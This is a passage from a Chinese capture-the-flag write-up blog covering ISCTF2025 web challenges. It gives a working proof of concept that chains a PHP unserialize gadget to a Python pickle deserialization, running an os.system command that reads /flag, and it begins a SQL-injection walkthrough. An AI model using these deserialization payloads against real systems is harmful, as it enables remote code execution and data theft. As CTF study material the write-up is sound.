<span class="keyword">or</span> <span class="keyword">not</span> hmac.compare_digest(sig, calc):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;==&gt; sig check failed&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ts <span class="keyword">and</span> (time.time() - <span class="built_in">float</span>(ts) &gt; <span class="number">600</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;==&gt; ts check failed&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_out</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.OUTS):</span><br><span class="line">            <span class="keyword">raise</span> FileNotFoundError(<span class="variable language_">self</span>.OUTS)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.OUTS, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> of:</span><br><span class="line">            content = of.read()</span><br><span class="line">        <span class="keyword">return</span> content <span class="keyword">or</span> <span class="string">&quot;喵喵喵?&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="variable language_">self</span>.init()</span><br><span class="line">        data = <span class="variable language_">self</span>.load_bin()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            obj = <span class="variable language_">self</span>._set_secret(data)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;==&gt; pickle load failed\n&quot;</span>, e)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.jmp:</span><br><span class="line">                Games().gen_redirect()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        meta = <span class="variable language_">self</span>.load_meta()</span><br><span class="line">        <span class="keyword">assert</span> <span class="variable language_">self</span>.sig_check(meta, data)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;==&gt; obj =&gt; &quot;</span>, obj)</span><br><span class="line"></span><br><span class="line">        payload = <span class="built_in">getattr</span>(obj, <span class="string">&#x27;payload&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">open</span>(<span class="variable language_">self</span>.OUTS, <span class="string">&quot;w&quot;</span>).close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(payload, (<span class="built_in">bytes</span>, <span class="built_in">bytearray</span>)):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                inner = pickle.loads(payload)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;==&gt; inner pickle load failed\n&quot;</span>, e)</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.jmp:</span><br><span class="line">                    Games().gen_redirect()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            out = <span class="variable language_">self</span>.read_out()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;==&gt; no outs =&gt;\n&quot;</span>, e)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.jmp:</span><br><span class="line">                Games().gen_redirect()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;==&gt; out =&gt; &quot;</span>, out)</span><br></pre></td></tr></table></figure>

<p><code>_set_secret</code>函数中用Unpickler去进行反序列化数据，提取secret属性作为HMAC的密钥</p>
<p><code>sig_check</code>函数是用来检查HMAC签名的，使用SECRET计算data的哈希</p>
<p>我们主要看一下主函数run</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="variable language_">self</span>.init()</span><br><span class="line">    data = <span class="variable language_">self</span>.load_bin()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        obj = <span class="variable language_">self</span>._set_secret(data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;==&gt; pickle load failed\n&quot;</span>, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.jmp:</span><br><span class="line">            Games().gen_redirect()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    meta = <span class="variable language_">self</span>.load_meta()</span><br><span class="line">    <span class="keyword">assert</span> <span class="variable language_">self</span>.sig_check(meta, data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==&gt; obj =&gt; &quot;</span>, obj)</span><br><span class="line"></span><br><span class="line">    payload = <span class="built_in">getattr</span>(obj, <span class="string">&#x27;payload&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">open</span>(<span class="variable language_">self</span>.OUTS, <span class="string">&quot;w&quot;</span>).close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(payload, (<span class="built_in">bytes</span>, <span class="built_in">bytearray</span>)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            inner = pickle.loads(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;==&gt; inner pickle load failed\n&quot;</span>, e)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.jmp:</span><br><span class="line">                Games().gen_redirect()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        out = <span class="variable language_">self</span>.read_out()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;==&gt; no outs =&gt;\n&quot;</span>, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.jmp:</span><br><span class="line">            Games().gen_redirect()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==&gt; out =&gt; &quot;</span>, out)</span><br></pre></td></tr></table></figure>

<p>读取&#x2F;tmp&#x2F;ssxl&#x2F;write.bin的内容并进行pickle反序列化，随后读取&#x2F;tmp&#x2F;ssxl&#x2F;write.meta元数据并验证签名</p>
<p>重点来了，这里会尝试获取pickle反序列化后的Set对象中的payload属性的值，并进行<code>pickle.loads(payload)</code>反序列化操作，这里的话就是没什么限制的</p>
<p>后面的就没什么好看的了，就是实例化一个ssxl对象并调用run去跑整个流程</p>
<h2 id="最终思路"><a href="#最终思路" class="headerlink" title="最终思路"></a>最终思路</h2><p>我们回到classes.php\Writer中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Writer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b64data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$binfile</span> = <span class="string">&quot;/tmp/ssxl/write.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$metafile</span> = <span class="string">&quot;/tmp/ssxl/write.meta&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;kaqikaqi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$init</span> = <span class="string">&#x27;喵喵喵?&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public function __construct($b64data=&quot;&quot;) &#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b64data = $b64data;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;init&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$this</span>-&gt;binfile);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0700</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write_all</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;b64data === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$raw</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;b64data);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$raw</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;binfile, <span class="variable">$raw</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sig</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$raw</span>, <span class="variable">$this</span>-&gt;secret);</span><br><span class="line">        <span class="variable">$meta</span> = <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&quot;sig&quot;</span> =&gt; <span class="variable">$sig</span>,</span><br><span class="line">            <span class="string">&quot;ts&quot;</span>  =&gt; <span class="title function_ invoke__">time</span>(),</span><br><span class="line">        ]);</span><br><span class="line">        @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;metafile, <span class="variable">$meta</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write_all</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;喵喵喵!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>毋庸置疑这里的init属性肯定是需要设置为init的，wakeup触发后会初始化文件目录，然后就想一下如何去写文件吧</p>
<p>根据刚刚的分析可以知道，首先Python 读取 write.bin，⽤ Unpickler.load() 恢复 Set 对象，并且在HMAC验证后会再次反序列化Set对象中payload的内容</p>
<h2 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h2><p>需要恢复的Set对象内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">import</span> builtins</span><br><span class="line">        <span class="keyword">return</span> (builtins.<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt; /tmp/ssxl/outs.txt&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Set</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret = state.get(<span class="string">&quot;secret&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.payload = state.get(<span class="string">&quot;payload&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = pickle.dumps(RCE(), protocol=pickle.HIGHEST_PROTOCOL)</span><br><span class="line">    <span class="built_in">set</span> = <span class="type">Set</span>()</span><br><span class="line">    <span class="built_in">set</span>.payload = payload</span><br><span class="line">    <span class="built_in">set</span>.secret = <span class="string">b&quot;kaqikaqi&quot;</span></span><br><span class="line"></span><br><span class="line">    data = pickle.dumps(<span class="built_in">set</span>, protocol=pickle.HIGHEST_PROTOCOL)</span><br><span class="line">    base64_data = base64.b64encode(data).decode()</span><br><span class="line">    <span class="built_in">print</span>(base64_data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后在php中的POC</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Writer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b64data</span> = <span class="string">&quot;gAWVnQAAAAAAAACMCF9fbWFpbl9flIwDU2V0lJOUKYGUfZQojAZzZWNyZXSUQwhrYXFpa2FxaZSMB3BheWxvYWSUQ2CABZVVAAAAAAAAAIwIYnVpbHRpbnOUjARldmFslJOUjDlfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY2F0IC9mbGFnID4gL3RtcC9zc3hsL291dHMudHh0JymUhZRSlC6UdWIu&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$binfile</span> = <span class="string">&quot;/tmp/ssxl/write.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$metafile</span> = <span class="string">&quot;/tmp/ssxl/write.meta&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;kaqikaqi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$init</span> = <span class="string">&#x27;init&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ser</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pytools</span> <span class="keyword">extends</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> = False;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logbuf</span> = <span class="string">&quot;成功写入&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bridge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$writer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shark</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Pytools</span>());</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Bridge</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; writer = <span class="keyword">new</span> <span class="title class_">Writer</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; shark = <span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; shark -&gt; ser = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/ISCTF2025/image-20251225164257135.png" alt="image-20251225164257135"></p>
<h1 id="kaqiWeaponShop"><a href="#kaqiWeaponShop" class="headerlink" title="kaqiWeaponShop"></a>kaqiWeaponShop</h1><p><img src="/../image/achieve/202411/ISCTF2025/image-20251227145932129.png" alt="image-20251227145932129"></p>
<p>一共有三个参数</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;name=1&amp;p=1</span><br></pre></td></tr></table></figure>

<p>id是武器编号，name是武器名，p是页数，测试之后发现其实p参数是没用的，他只是一个翻页的功能，并没有进行sql查询</p>
<p>手测了一下，id是一个注入点但是只能接收数字，name的话估计</p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251227150923177.png" alt="image-20251227150923177"></p>
<p>嗯。。。不妨大胆的猜测一下这里的sql语句应该是一个or语句</p>

    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2025/12/26/ISCTF2025Web%E9%A2%98%E8%A7%A3/" title="ISCTF2025Web题解">https://wanth3f1ag.top/2025/12/26/ISCTF2025Web题解/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/ISCTF2025/" rel="tag"># ISCTF2025</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/12/24/HKCERTCTF2025-Labyrinth/" rel="prev" title="HKCERTCTF2025 Labyrinth">
                  <i class="fa fa-angle-left"></i> HKCERTCTF2025 Labyrinth
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/12/29/2025%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" rel="next" title="2025年年终总结">
                  2025年年终总结 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3.4m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">51:48</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
